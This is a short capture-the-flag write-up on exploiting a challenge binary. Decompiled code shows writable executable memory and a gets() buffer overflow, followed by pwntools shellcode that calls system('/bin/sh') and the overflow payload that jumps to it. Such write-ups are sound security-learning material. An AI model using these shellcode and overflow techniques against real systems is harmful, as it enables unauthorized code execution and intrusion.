# Chal 5

## Solution

The first thing this challenge does is create some executable memory and allows the user to write to it:
```
004014fe      int64_t mapped_mem = mmap(addr: 0xca110000, len: 0x1000, prot: 7, flags: 0x22, fd: 0xffffffff, offset: 0)
00401510      if (mapped_mem != 0xca110000)
0040151c          puts(str: "mmap failed!")
00401526          exit(status: 0xffffffff)
00401526          noreturn
00401541      ssize_t size = read(fd: 0, buf: mapped_mem, nbytes: 0x24)
```
Next, the challenge gives the user an opportunity for a buffer overflow attack using a `gets`:
```
004015ea              slow_print("MMMOOOOORRRREEEEE! >>>")
00401604              void var_18
00401604              return gets(buf: &var_18)
```
Thus, the strategy to solving this challenge is to write shellcode that calls `/bin/sh` and then jump to that shellcode using the buffer overflow. First, here is the shellcode that we use:
```python
bin_sh = b'/bin/sh\0'
shell = asm(f"""
    pop rax
    mov rax, {u64(bin_sh)}
    push rax
    mov rdi, rsp
    mov rax, {e.plt['system']}
    jmp rax
""")
```
Then, we jump to this using the buffer overflow:
```python
p = start()
p.sendlineafter(b'>>>', shell)
p.sendlineafter(b'>>>', b'a')

payload = cyclic(32)
payload += p64(0xca110000)
p.sendlineafter(b'>>>', payload)

p.interactive()
```